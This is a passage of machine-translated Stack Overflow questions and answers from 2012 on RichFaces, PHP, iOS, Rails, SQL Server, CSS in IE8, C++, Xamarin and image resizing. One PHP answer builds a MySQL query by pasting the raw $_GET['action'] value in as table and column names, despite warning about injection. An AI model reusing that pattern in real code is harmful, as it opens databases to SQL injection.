                <a4j:commandLink id="logoutLinkId"
                                 value="Logout"
                                 onclick="Richfaces.showPopupPanel('logoutDialogId')"
                                 styleClass="linkLogout"/></li>

        </ul>
        <div style="clear:both"></div>
    </a4j:outputPanel>
</ui:composition> 
```

编辑：附加加载的 JS 截图

![在此处输入图像描述](../Images/fb07c4c1b57a1a0671cc7cce6d8d5a9c.png)

谢谢，

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-02T18:57:06.223

上述代码的问题是，由于 RichFaces 4.0 我们无法进行旧调用来打开 popupPanel，因此您编写它的方式已经过时，如果可以，请尝试以下操作：-

```
<a4j:commandLink id="logoutLinkId"
    value="Logout"
    onclick="#{rich:component('logoutDialogId')}.show();"
    styleClass="linkLogout"/> 
```

并且类似地隐藏 popupPanel 使用

```
<a4j:commandLink id="Close_Modal"
    value="Close Logout"
    onclick="#{rich:component('logoutDialogId')}.hide();"
    styleClass="linkLogout"/> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T20:30:42.817

`<h:head>`从包含组合中删除。它不属于那里，并且可能会损坏生成的 HTML 头。`<h:head>`应该在整个视图中只声明一次，最好只在主模板中声明。

另一个可能的原因是您有一个`Filter`恰好与资源请求的 URL 模式匹配的，而这反过来又没有完全正确地完成它的工作。检查 HTML 源代码，哪些`<script>`元素全部生成，然后在 Firebug/Chrome/IE9 中按 F12 并探索*Net*（或*Network*）选项卡以查看哪些浏览器已全部检索到 JS 资源。

* * *

**更新**：对象名是`RichFaces`大写的`F`，不是`Richfaces`。修复它。

# php - 将变量从 javascript 传递到 php get 语句

> ID：10403901
> 
> 赞同：1
> 
> 时间：2012-05-01T20:28:17.143
> 
> 标签：php, javascript, jquery, get

我在以前的帖子中寻找过这个，如果得到了回答，我深表歉意。我的 javascript 如下，其中 data 参数是一个字符串，它引用 MySQL 数据库中的一个表：

```
 getData("UKnatgas");

function getData(data){
$.getJSON("service.php?action="+data, function(json) {              
    $.each(json.UKnatgas,function() {
       var info = this.UKnatgas;                    
                $('#UKnatgas').append( info );
    });
});
} 
```

首先，我想将字符串“UKnatgas”传递到子 $.each 函数中，这样它就会显示为：

```
$.each(json.data,function() {
       var info = this.data;                    
                $('#data').append( info );
    }); 
```

但这不起作用？你能告诉我为什么吗？

第二部分是在 php 文件中删除所有“UKnatgas”实例：

```
 if($_GET){
if($_GET['action'] == 'UKnatgas'){
    $query = "SELECT UKnatgas FROM UKnatgas order by Date DESC Limit 1 ";
    $result = db_connection($query);

    $UKnatgas = array();

    while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
        array_push($UKnatgas, array('UKnatgas' => $row['UKnatgas']));
    }
    echo json_encode(array("UKnatgas" => $UKnatgas));
    exit;
    }
} 
```

总而言之，我想用一个字符串初始化函数 getData(data)，该字符串传播到 javascript 函数，然后是 php 文件。这可能吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:36:08.603

PHP 很简单，虽然我会允许某种类型的错误检查，甚至可能会在您放置用户可编辑字符串时检查黑客尝试。这可能允许`MySQL Injection`所以要小心。

如果可以，请`mysql_real_escape_string`尽可能使用。有关更多信息，请参见链接：[http ://www.php.net/manual/en/function.mysql-real-escape-string.php](http://www.php.net/manual/en/function.mysql-real-escape-string.php)

```
if($_GET['action']){
    $query = "SELECT `".$_GET['action']."` FROM `".$_GET['action']."` order by Date DESC Limit 1 ";
    $result = db_connection($query);

    $actionArray = array();

    while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
        array_push($actionArray, array($_GET['action'] => $row[$_GET['action']]));
    }
    echo json_encode(array($_GET['action'] => $actionArray));
    exit;
} 
```

并不确定，但这应该适用于 JSON

```
$.each(json, function(key, val) {
    $('#'+data).append( val );
}); 
```

[http://api.jquery.com/jQuery.getJSON/](http://api.jquery.com/jQuery.getJSON/)

我在您的案例中对其进行了测试，您需要执行以下操作才能访问数据。现在这是使用 JSON 作为关联数组，它不是，但不是 100% 如何做到这一点。

```
function getData(data) { 
    $.getJSON("service.php?action="+data, function(json) { 
        $.each(json[data], function() { 
            var info = this[data];
            $('#'+data).append( info ); 
        }); 
    });
} 
```

# iphone - 在后台状态下安排重新占用的任务。(iOS)

> ID：10403904
> 
> 赞同：1
> 
> 时间：2012-05-01T20:28:28.843
> 
> 标签：iphone, objective-c, ios, ipad, scheduled-tasks

如果我的研究在您的应用程序处于后台时是正确的，那么它真的被暂停了。Apple 支持的后台任务方法是位置、音频和 SIP 类型的应用程序，这是正确的吗？

是否有任何 Apple 支持的方法可以在后台每 60 秒运行一次方法，我需要检查服务器的状态。以下代码可以满足我的需要，但会在 10 分钟后停止，我认为这是 Apple 支持的另一种方法。关于这是否可能的任何建议或确认都会有所帮助。

下面的代码只是创建了一个每 10 秒运行一次并更新徽章计数的任务。

问候

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    count=0;
    counterTask = [[UIApplication sharedApplication]
                   beginBackgroundTaskWithExpirationHandler:^{
                       // If you're worried about exceeding 10 minutes, handle it here
                  }];
    theTimer=[NSTimer scheduledTimerWithTimeInterval:5
                                             target:self
                                           selector:@selector(countUp)
                                            userInfo:nil
                                            repeats:YES];
}

- (void)countUp {
    NSLog(@"%s - %d", __FUNCTION__, count + 1 );

    if (count==1000) {
        [theTimer invalidate];
        [theTimer release];
        [[UIApplication sharedApplication] endBackgroundTask:counterTask];
    } else {
        count++;
        NSString *currentCount;
        currentCount=[[NSString alloc] initWithFormat:@"%d",count];
         [currentCount release];
        [UIApplication sharedApplication].applicationIconBadgeNumber = count;

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:50:19.483

不幸的是，我也在我的应用程序中使用了这个 10 分钟的后台任务，根据我所做的研究，这是在后台运行方法的唯一方法。希望这能回答你的问题

# ruby-on-rails - 每周活动日历的范围

> ID：10403905
> 
> 赞同：0
> 
> 时间：2012-05-01T20:28:34.080
> 
> 标签：ruby-on-rails, activerecord, scope

所以我有一个事件日历的每周视图，并且我试图找出最好的方法来获取每一天发生的事件。

目前，我对 events_controller 的索引操作使用 Event.rb 上的类方法来获取该周发生的所有事件。但是，我想创建一个按天显示事件的表，如下所示：

```
Sunday 04/29/2012
      Class 10:00 am
Monday 04/30/2012
      Class 10:00 am
Tuesday 05/01/2012
      Class 10:00 am
Wednesday 05/02/2012
      Class 10:00 am
Thursday 05/03/2012
      Class 10:00 am
Friday 05/04/2012
      Class 10:00 am
Saturday 05/05/2012
      Class 10:00 am 
```

我不太确定从一周内发生的事件范围中获取每天发生的事件的最佳方法是什么。

```
#event.rb
class Event < ActiveRecord::Base
  def self.for_week_starting(day=Date.today.beginning_of_week(:sunday))
    sunday = day.beginning_of_week(:sunday)
    saturday = day.end_of_week(:sunday)
    where(:date => sunday..satuday)
  end
end 
```

编辑： Enumerable group_by 似乎是要走的路。我可以设置一个每周范围并对其进行迭代，然后用于`@workouts.group_by(&:date)`获得一组每次锻炼，我只是不太清楚如何在与我感兴趣的日期相匹配的情况下让该组脱离组。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T11:36:23.367

没有最终使用范围，每说，但这是完整的解决方案。花了很多时间在控制台上找出内置方法返回的内容，但在那之后，逻辑并不太难。

```
#event.rb
class Event < ActiveRecord::Base 
  def self.for_week_starting(day=Date.today.beginning_of_week(:sunday))
    sunday = day.beginning_of_week(:sunday)
    saturday = day.end_of_week(:sunday)
    where(:date => sunday..saturday)
  end
end

  #events_controller.rb
def index
  #use today's date if none comes through params
  start_date = params[:start_date] ? params[:start_date].to_date : Date.today
  @week = (start_date.beginning_of_week(:sunday)..start_date.end_of_week(:sunday))
  @events = Event.for_week_starting(@week.first).group_by(&:date)
end

#index.html.erb
<% @week.each do |day| %>
  <%= day.strftime('%A, %B %e, %Y')%></th>
  <% unless @events[day].nil? then %>
    <% @events[day].each do |event| %>
      <%= link_to event.name, event_path(event) %>
    <% end %>
    <% end %>
<% end %> 
```

# sql-server-2008 - 我可以使用系统视图来获取表中所有列的聚合值吗？

> ID：10403909
> 
> 赞同：0
> 
> 时间：2012-05-01T20:28:47.540
> 
> 标签：sql-server-2008, system-views

我正在建立一个表格，我想看看每列有多少个 0 值。我以前从未使用过系统视图......我可以做这样的事情吗？（这在输入时不起作用，当然，它只是为了传达意图）：

```
SELECT t.COLUMN_NAME, (SELECT COUNT(ID) FROM tblKeyStatistics t2 WHERE 
t2.ColumnName = t.COLUMN_NAME AND t2.ColumnName = 0) AS CountOf0
FROM INFORMATION_SCHEMA.COLUMNS t
WHERE TABLE_NAME = 'tblKeyStatistics' 
```

所以输出看起来像：

```
EntValue    2
TrailingPE  1
ForwardPE   11 
```

每个整数都是表中该列中 0 值的计数。

提前致谢...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:34:50.270

不，系统视图/DMV 不会跟踪单个列的值或空/非空状态，除非它们存储在某个未记录的位置（我对此表示怀疑）。要获取此信息，您需要针对实际对象运行查询。当然，您可以以更自动化的方式生成查询：

```
DECLARE @table sysname = N'dbo.tblKeyStatistics'; -- please use schema prefix

DECLARE @sql nvarchar(max) = N'';

SELECT @sql += CHAR(13) + CHAR(10) 
  + QUOTENAME(name) + N' =  SUM(CASE WHEN ' 
  + QUOTENAME(name) + N' = 0 THEN 1 ELSE 0 END),'
  FROM sys.columns
  WHERE [object_id] = OBJECT_ID(@table)
  -- make sure you only get numeric types:
  AND system_type_id IN (48, 52, 56, 59, 60, 62, 104, 106, 108, 122, 127);

SELECT @sql = N'SELECT ' + @sql + N' TotalRows = COUNT(*) 
  FROM ' + @table + N';';

PRINT @sql;
--EXEC sys.sp_executesql @sql; 
```

这看起来会导致非常昂贵的查询，但实际上它只是进行聚集索引扫描（很像`SELECT *` 会做的，只是增加了一点数学）。

也请远离 INFORMATION_SCHEMA 视图。他们不健康：

*   [针对 INFORMATION_SCHEMA 视图的案例](https://sqlblog.org/2011/11/03/the-case-against-information_schema-views)

# ruby-on-rails - 有很多通过连接表 - 附加关联

> ID：10403913
> 
> 赞同：1
> 
> 时间：2012-05-01T20:28:53.200
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord, has-many-through, one-to-one

我有一张表格，将两个模型连接在一起，有很多直通关系。

用户通过权限拥有许多角色

我的 Authorities 表有三列 user_id role_id firm_id

我希望每个权限（连接表）都与公司建立一对一的关系。这可能吗？

--- 编辑也许多一点信息会更清楚。

我有很多“公司”

“用户”通过“关注”拥有许多公司

“用户”还通过“权限”拥有多个“角色”

我正在使用 cancan gem 来限制用户的权限，以便他们可以关注任何公司，但他们只能编辑单个公司的详细信息。这意味着我无法在用户和公司之间创建直接的 1 对 1 关联，因为他们已经拥有了很多通过关联 - 通过关注。Current_user.firms 将返回他们关注的所有公司。

因此，我想将他们拥有编辑权限的公司存储在授权模型中，加入用户和角色。

[https://docs.google.com/drawings/d/1CiKsUEdcS6hmKa23xsapWy33NS0Gp1f11a7TgaZbAy0/edit](https://docs.google.com/drawings/d/1CiKsUEdcS6hmKa23xsapWy33NS0Gp1f11a7TgaZbAy0/edit)

这应该显示我的表格布局 - 虚线是我想要建立的关联。

目前我的模型看起来像这样。

```
class Firm < ActiveRecord::Base

has_one :authority
has_many :follows, :dependent => :destroy
has_many :users, :through => :follows

class Follow < ActiveRecord::Base
belongs_to :firm
belongs_to :user

 class User < ActiveRecord::Base
 has_many :follows, :dependent => :destroy 
 has_many :firms, :through => :follows
 has_many :roles, :through => :authorities
 has_many :authorities

 class Role < ActiveRecord::Base
 has_many :users, :through => :authorities
 has_many :authorities

class Authority < ActiveRecord::Base
 belongs_to :users
belongs_to :roles
belongs_to :firm 
```

如果我能做到这一点，我将如何选择（在控制台中我将从中着手）一个特定的“权威”并添加一个“公司”。此外，我将如何阅读这个嵌套属性？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:36:12.947

我不明白为什么不。你到底有什么问题？

```
class Authority < ActiveRecord::Base
    belongs_to :firm
end

class Firm < ActiveRecord::Base
    has_one :authority
end 
```

* * *

您应该能够像这样更新权威的firm_id：

```
authority = Authority.last
authority.firm = Firm.last # or authority.update_attribute(:firm_id, Firm.last.id)
authority.save 
```

# jquery - jQuery 工具可滚动 + 移动 safari 错误？

> ID：10403915
> 
> 赞同：1
> 
> 时间：2012-05-01T20:28:59.793
> 
> 标签：jquery, mobile-safari, jquery-tools, scrollable

此页面上可滚动的 jQuery 工具...

[https://s140452.gridserver.com/](https://s140452.gridserver.com/)

不能在 iPad 或 iPhone 中切换图像...是否有错误，或者我做错了什么？

```
 $j(document).ready(function() {
        $j('.scrollable').scrollable({
            circular: true
        }).navigator('#slide-nav').autoscroll({ autoplay: true });
    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T21:56:42.497

如果您希望滑块在 iOS / 移动 safari 上正常工作，请不要使用可滚动。

[http://iosscripts.com/iosslider-jquery-horizo​​ntal-slider-for-iphone-ipad-safari/](http://iosscripts.com/iosslider-jquery-horizontal-slider-for-iphone-ipad-safari/)

该脚本就在它所在的位置。

# html - 为什么伪元素上的过滤器渐变在 IE8 中不起作用？

> ID：10403916
> 
> 赞同：35
> 
> 时间：2012-05-01T20:29:15.423
> 
> 标签：html, css, internet-explorer-8, pseudo-element

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-05-20T01:00:04.467

问题是“为什么过滤器不能处理 IE8 中的伪元素？” 以下是我所能收集到的最接近明确的答案。它来自[此页面](http://msdn.microsoft.com/en-us/library/ms532853%28v=vs.85%29.aspx)上的信息。

过滤器`gradient`是一个“程序表面”（与 一起`alphaimageloader`）。程序曲面定义如下：

> 程序表面是显示在对象内容和对象背景之间的彩色表面。

仔细阅读。它本质上是您可以在对象的内容和该对象的背景之间说的另一个“层”。你看到问题的答案了吗？`:before`和创造了什么`:after`……是的！*内容*。具体如[MSDN 注释](http://msdn.microsoft.com/en-us/library/cc304078%28v=vs.85%29.aspx)：

> ::before 和 ::after 伪元素指定文档树中元素之前和之后的内容位置。content 属性与这些伪元素一起指定插入的内容。
> 
> 生成的内容与其他框交互，就好像它们是插入到相关元素中的真实元素一样。

现在，如果生成的是*内容*，那么它就*不是*包含内容的“对象”，而是*内容本身*（恰好具有类似于可能包含内容的元素对象的某些行为）。

因此，不存在*包含*“内容”（因为它*是*内容）的“对象”，它们之间`filter`可以放置由伪元素（即“假元素”）生成的内容的程序表面。必须将A`gradient`应用于*对象*，然后将程序表面放置在它和内容之间。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-19T22:50:32.557

关于[`-ms-filter`](http://msdn.microsoft.com/en-us/library/ms533754%28v=vs.85%29.aspx)-a 的同义词`filter`- 的文档指出：

> 对象必须具有过滤器才能呈现的布局。

我的第一个猜测是`:before`内容没有`hasLayout`设置为真。虽然它可能未设置为 true ，但也可能*未设置为 false*。对于初学者，当我按照[hasLayout 文档](http://msdn.microsoft.com/en-us/library/ms533776%28v=vs.85%29.aspx)强制获取内容时`hasLayout = true`（请参阅[jsfiddle](http://jsfiddle.net/7w7j9/)），它没有解决任何问题。

所以我会说这既不是真的也不是假的。相反，它可能是*undefined*。我在同一文档中提到了该属性的来源：

> *对象***.currentStyle.hasLayout**

如果我们查看[有关 content 属性的 W3 文档，](http://www.w3.org/TR/CSS21/generate.html#content)它会说：

> 生成的内容不会改变文档树。特别是，它不会被反馈给文档语言处理器（例如，用于重新解析）。

因此，**可能的结论**是生成的内容不是*object*，因此它没有`currentStyle`属性，因此也没有`hasLayout`设置为`true`。这就是过滤器对生成的内容不起作用的原因，因此可以回答问题。

* * *

乍一看，我以为我在上面小提琴的控制台中找到了提示：

```
document.querySelectorAll('div')[0].currentStyle.hasLayout; 
// true

document.querySelectorAll('div:before')[0].currentStyle.hasLayout
// Unable to get value of the property 'currentStyle': 
// object is null or undefined 
```

但正如@BoltClock 的评论中提到的那样：[querySelectorAll 无法访问 pseudo-elements](http://www.w3.org/TR/selectors-api/#processing-selectors)。

* * *

[在这个 msdn 关于过滤器的介绍](http://msdn.microsoft.com/en-us/library/ms533035.aspx#CSS_Filters)`filter`中可以找到另一个不适用于伪元素的提示（尽管 - 再次 - 只不过是一个提示），说明（强调我的）：

> 过滤器通过 filter 属性应用于*HTML 控件*

虽然我不确定“HTML 控件”是什么意思，但我不希望`:before`伪元素生成的内容被视为“HTML 控件”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-05T10:55:44.893

我已经给出了我首选的解决方案（使用 CSS3Pie），但我会将其作为单独的答案发布。

IE8 无法与 IE7 兼容的可能原因`filter`是 IE8 更改了`filter`.

`filter`是一种特定于 IE 的专有风格。当微软发布 IE8 时，他们强调要“符合标准”。支持非标准样式的“符合标准”的方式是给它一个供应商前缀，这就是微软所做的。

因此，在 IE8 中，您需要执行以下操作：

```
-ms-filter: "progid:DXImageTransform.Microsoft.gradient( startColorstr='#80ffffff', endColorstr='#00ffffff',GradientType=0 )"; 
```

IE7 不支持这种语法，所以你需要它们。

*在某些情况下*，IE8 实际上确实可以使用旧语法。它不起作用的情况往往是您使用`progid:`语法的情况。原因是后面的冒号导致它是无效的 CSS 语法，这就是为什么 MS 在 IE8版本`progid`的整个薄周围添加引号的原因。`-ms-filter`

所以简短的回答是，在你的样式表中使用这两个版本，你会没事的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-19T03:38:31.547

哇，这是一个艰难的过程。

[在查看此图表](http://css-tricks.com/browser-support-pseudo-elements/)，确认[IE8 仅喜欢其伪元素上的单冒号](http://www.red-team-design.com/before-after-pseudo-elements)，阅读此[可能相关的博客文章](http://www.pixelastic.com/blog/255%3aie8-ghost-pseudo-elements)，并在 jsFiddle 中进行了大量[测试后](http://jsfiddle.net/3PTkG/10/)（尽管与您的 73?? jsFiddles 相比，它很少），我会不得不断定这是IE8中的一个bug。

IE9 可以在伪元素上做渐变（用 base64 废话），但 IE8 被顽固地破坏了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-04T08:19:57.523

[您是否考虑过使用CSS3Pie](http://css3pie.com/)而不是`filter`为此使用 IE 的样式？

这是一个 IE 脚本，增加了对标准 CSS`box-shadow`和渐变的支持，因此您可以在所有浏览器中编写相同的代码，而不必拥有所有那些 IE 特定的样式。

# c++ - 如何返回可变数量的各种类型的容器？

> ID：10403917
> 
> 赞同：2
> 
> 时间：2012-05-01T20:29:16.260
> 
> 标签：c++, boost, generic-programming, boost-mpl, boost-variant

我的数据如下所示：

```
 token            eps  rank # first line names columns
 Intercept   9.362637e+00     1 # later lines hold data
        A1  -2.395553e-01    30
        G1  -3.864725e-01    50
        T1   1.565497e-01    43
.... 
```

不同的文件将具有不同数量的命名列，并且每列中的值类型将在浮点数、整数和字符串之间有所不同。

我想编写一个`readCols`函数，向其发送列名（例如，我可能需要`token`和`rank`列），它将指定列中的数据放入适当类型的容器中。

我的问题不在于解析文件，而在于返回包含不同类型的可变数量的容器。例如，我希望将`token`和`rank`列分别放入`vector<string>`和`vector<int>`容器中。这里的问题是我可能想要该`eps`列（存储在向量中），并且我不想`readCols`为每种可能的类型组合编写不同的函数。（容器的类型对我来说无关紧要。如果我必须只使用`vector`s，没问题；每个容器包含不同的类型是关键。）

我可能需要一个容纳不同类型的容器来容纳不同类型的容器。看起来[Boost.Variant](http://www.boost.org/doc/libs/1_49_0/doc/html/variant.html)可能是我想要的解决方案，但我不知道如何告诉解析器我希望每列是哪种类型（我可以制作类似类型名列表的东西吗？例如`void readCols(string filename, vector<variant<various types of vector>> &data, vector<string> colNames, vector<typename> convertTo)`）。同样，[Boost.Mpl.Vector](http://www.boost.org/doc/libs/1_49_0/libs/mpl/doc/refmanual/vector.html)可能会解决问题，但我还是不太清楚如何判断`readCols`每列想要如何转换。

我至少可以想到两种解决方法：

1.  使用读入任何容器的模板化函数分别读取每一列（`container::value_type`允许函数知道如何解析）。我不喜欢这种解决方案，因为文件有时很大（数百万行），因此多次解析它们会花费额外的几分钟（在计算需要约 30 分钟的程序中，运行时间的百分比可忽略不计；程序将一遍又一遍地跑）。
2.  将所有列读入字符串容器并在调用上下文而不是解析上下文中重新转换它们。这不会那么糟糕，因为我认为我可以使用`std::transform`and`boost::lexical_cast`或 s/t 在一行中进行转换。如果我能避免`2n`臃肿的行，那就太好了（`n`=列数，通常为 2 或 3，每列 2 行来声明容器然后转换）。

与完整的通用解决方案相比，第二种解决方法可能需要我付出的努力要少得多；如果是这样，我想知道。我想第二种解决方法甚至可能更有效，但我目前主要关心的是易用性。如果我可以编写一个通用`readCols`函数并完成它，那就是我更喜欢的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T21:35:07.810

当事情变得太复杂时，我将问题分解成更小的部分。所以这里有一个建议。

编写一个 CSV 阅读器类，它可以从文件中读取逗号或其他分隔符分隔的值。该类一次读取一行并将该行分成 std​​::string 字段。为了访问字段，您需要实现 getString、getInt、getDouble 等函数来访问字段（按列名或索引）并将它们转换为适当的类型。因此，读者做了一个定义明确的事情并处理*有限*数量的原始类型。

然后实现使用 CSV 阅读器的阅读器功能（或类）。这些读取器函数知道列的特定类型以及将它们的值放在哪里——无论是在标量、容器等中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-02T16:09:58.430

只要返回值的类型是有限的，例如`int`、`double`或`std::string`，这样的函数就可以完成这项工作：

```
using namespace std;
void readCols(string fileName, vector<string> stringCols, 
      vector<string> intCols, vector<string> doubleCols, 
      vector<vector<string> > *stringData, 
      vector<vector<int> > *intData, 
      vector<vector<double> > *doubleData); 
```

（可能足够清楚，但是您根据它们的类型列出所需的列名。）

旁观者认为这是否比解决方法更麻烦。

# xamarin.android - 使用自定义适配器时如何将微调器设置为特定值

> ID：10403923
> 
> 赞同：1
> 
> 时间：2012-05-01T20:29:58.527
> 
> 标签：xamarin.android

我有一个微调器，我正在用表格中的数据填充。所以我使用的是定制的适配器，因为我需要能够显示一列，但我将存储在表中的数据来自另一列。假设我有一张名为 color 的表。它有一个 ID 字段和 Desc 字段。因此，当您选择一种颜色时，我的微调器将显示红色、绿色、蓝色、黑色，我需要获取该颜色的 ID 并将其存储。我制作了微调器并且工作正常。我创建了一个客户适配器来拉入表格，这是我的适配器。

```
class SpinnerAdapter : BaseAdapter
{
    private IEnumerable<Color> _Color;
    private Activity _context;

    public SpinnerAdapter(Activity context, IEnumerable<Color> Color)
    {
        _context = context;
        _Color = Color;
    }

    public override View GetView(int position, View convertView, 
                                 ViewGroup parent)
    {
        var view = (convertView ?? _context.LayoutInflater.Inflate(
            Resource.Layout.SpinnerList, parent, false)) as LinearLayout;
        var Color = _Color.ElementAt(position);
        view.FindViewById<TextView>(Resource.Id.ID).Text = 
            Color.ColorCd.ToString();
        view.FindViewById<TextView>(Resource.Id.TimeID).Text =
            Color.ColorDesc.ToString();

        return view;
    }

    public override int Count
    {
        get { return _Color.Count(); }
    }

    public Color GetColor(int position)
    {
        return _Color.ElementAt(position);
    }

    public override Java.Lang.Object GetItem(int position)
    {
        return null;
    }
    public override long GetItemId(int position)
    {
        return position;
    }
} 
```

在我的活动页面中，我将适配器设置为微调器，如下所示；

```
Spinner spAdapter = FindViewById<Spinner>(Resource.Id.spAdapter);
spAdapter.ItemSelected += new EventHandler<ItemEventArgs>(spAdapter_ItemClick);
var Color = ((LeavApplication)Application).LeaveRepository.GetAllColor();
spAdapter.Adapter = new SpinnerAdapter(this, Color); 
```

那部分一切正常。但如果我有一个值，我希望微调器设置为我该怎么做。例如，我想将微调器的值设置为“蓝色”，如何找到蓝色的位置，以便我可以使用 SetSelection 函数来设置微调器。我需要在我的适配器中创建一个功能吗？它会是什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T09:08:14.507

我认为您可以自己使用颜色列表，然后可以在微调器上使用 SetSelection 吗？

例如：

```
 Spinner spinner = FindViewById<Spinner>(Resource.Id.spAdapter);
  spinner.ItemSelected += new EventHandler<ItemEventArgs>(spAdapter_ItemClick);
  var colors = ((LeavApplication)Application).LeaveRepository.GetAllColor().ToList();
  spinner.Adapter = new SpinnerAdapter(this, colors);
  spinner.SetSelection(colors.IndexOf(TheColorIWant)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-02T14:55:42.080

我想出了一个对我有用的答案。在我的自定义适配器“SpinnerAdapter.cs”中，我添加了一个函数。

```
public int GetPosition(string value)
{
  int i = 0;
  foreach (var item in _Color)
  {
    if (item.ColorDesc == value)
    {
      return i;
    }
    ++i;
  }
  return 0;
} 
```

然后在我的活动页面中，我可以添加它。

```
 Spinner spAdapter = FindViewById<Spinner>(Resource.Id.spAdapter);
  spAdapter.ItemSelected += new EventHandler<ItemEventArgs>(spAdapter_ItemClick);
  var Color = ((LeavApplication)Application).LeaveRepository.GetAllColor();
  spAdapter.Adapter = new SpinnerAdapter(this, Color);

  // Set the spinner with preDefined value
  string sColor = "Green";
  int iPosition = ((SpinnerAdapter)spAdapter.Adapter).GetPosition(sColor);
  FindViewById<Spinner>(Resource.Id.spAdapter).SetSelection(iPosition); 
```

并将所选项目设置为预定颜色。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-04-30T18:39:18.573

您应该在主体中使用以下方法

```
 int itemPosition = spinnerConsultationDegreeAdapter.GetItemPosition(request.ConsultationDegreeId);
        spinnerConsultationDegree.SetSelection(itemPosition); 
```

然后添加一个功能对应的适配器

```
 public int GetItemPosition(int consultationDegreeId)
    {
        var degree = _consultationDegrees.FirstOrDefault(q => q.Id == consultationDegreeId);
        var position = _consultationDegrees.IndexOf(degree);
        return position;
    } 
```

# php - PHP图像调整大小切断了我的图像

> ID：10403924
> 
> 赞同：1
> 
> 时间：2012-05-01T20:29:59.607
> 
> 标签：php, resize

我这里有这个功能.....

```
function create_thumbnail($source,$destination, $thumb_width) {
        $size = getimagesize($source);
        $width = $size[0];
        $height = $size[1];
        $x = 0;
        $y = 0;
        if($width> $height) {
            $x = ceil(($width - $height) / 2 );
            $width = $height;
        } elseif($height> $width) {
            $y = ceil(($height - $width) / 2);
            $height = $width;
        }
        $new_image = imagecreatetruecolor($thumb_width,$thumb_width)or die('Cannot Initialize new GD image stream');
        $extension = get_image_extension($source);
         if($extension=='jpg' || $extension=='jpeg') 
            $image = imagecreatefromjpeg($source); 
        if($extension=='gif') 
            $image = imagecreatefromgif($source); 
        if($extension=='png') 
            $image = imagecreatefrompng($source);   

        imagecopyresampled($new_image,$image,0,0,$x,$y,$thumb_width,$thumb_width,$width,$height);
        if($extension=='jpg' || $extension=='jpeg') 
           imagejpeg($new_image,$destination); 
        if($extension=='gif') 
            imagegif($new_image,$destination); 
        if($extension=='png') 
            imagepng($new_image,$destination); 
    } 
```

这是做什么的，它需要一张图像并调整大小，但它并没有像我预期的那样调整大小，我期待它会拍摄一张宽幅图像或一张高大图像或一个正常尺寸的图像并将其剪掉，使其适合该尺寸，它可以调整大小，但它会切断我的大部分图像......我已经为此苦苦挣扎了好几天，我似乎无法找到一种方法来调整我的图像大小而不切断它们......我希望我能找到一些帮助它会非常感激......所以，很累......

例如，我有这张图片....

![在此处输入图像描述](../Images/0f8d48f9194f0d08b67fe1fafa8c64b3.png)

当我为该图像运行该函数时，它返回此...

![在此处输入图像描述](../Images/8c113d6d14a08d234ac08b6e1fedd807.png)

我期待的是相同的图像，只是更小。

我更改了这部分代码...

```
imagecopyresampled($new_image,$image,0,0,0,0,$thumb_width,$thumb_width,$width,$height); 
```

将`$x`and更改`$y`为“0”和“0”，这就是出现的...

![在此处输入图像描述](../Images/32933cfd4bb90debee9178e5b831b2d6.png)

我接近我正在寻找的东西，但完整的图像不存在......它仍然被切断。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T21:33:38.167

对于您想要的，您可以使用此功能：

```
function create_thumbnail($source, $destination, $thumbWidth)
{
    $extension = get_image_extension($source);
    $size = getimagesize($source);
    $imageWidth  = $newWidth  = $size[0];
    $imageHeight = $newheight = $size[1];

    if ($imageWidth > $thumbWidth || $imageHeight > $thumbWidth)
    {
        $newWidth  = $newHeight = $thumbWidth;
    }

    $newImage = imagecreatetruecolor($newWidth, $newHeight);

    switch ($extension)
    {
        case 'jpeg':
        case 'jpg':
            $imageCreateFrom = 'imagecreatefromjpeg';
            $store = 'imagejpeg';
            break;

        case 'png':
            $imageCreateFrom = 'imagecreatefrompng';
            $store = 'imagepng';
            break;

        case 'gif':
            $imageCreateFrom = 'imagecreatefromgif';
            $store = 'imagegif';
            break;

        default:
            return false;
    }

    $container = $imageCreateFrom($source);
    imagecopyresampled($newImage, $container, 0, 0, 0, 0, $newWidth, $newHeight, $imageWidth, $imageHeight);
    return $store($newImage, $destination);
}
var_dump(create_thumbnail('sample.jpg', 'sample_thumb_no_ratio.jpg', '255')); 
```

但是，如果你想保留图像比例，你可以使用这样的东西：

```
function create_thumbnail_preserve_ratio($source, $destination, $thumbWidth)
{
    $extension = get_image_extension($source);
    $size = getimagesize($source);
    $imageWidth  = $newWidth  = $size[0];
    $imageHeight = $newheight = $size[1];

    if ($imageWidth > $thumbWidth || $imageHeight > $thumbWidth)
    {
        // Calculate the ratio
        $xscale = ($imageWidth/$thumbWidth);
        $yscale = ($imageHeight/$thumbWidth);
        $newWidth  = ($yscale > $xscale) ? round($imageWidth * (1/$yscale)) : round($imageWidth * (1/$xscale));
        $newHeight = ($yscale > $xscale) ? round($imageHeight * (1/$yscale)) : round($imageHeight * (1/$xscale));
    }

    $newImage = imagecreatetruecolor($newWidth, $newHeight);

    switch ($extension)
    {
        case 'jpeg':
        case 'jpg':
            $imageCreateFrom = 'imagecreatefromjpeg';
            $store = 'imagejpeg';
            break;

        case 'png':
            $imageCreateFrom = 'imagecreatefrompng';
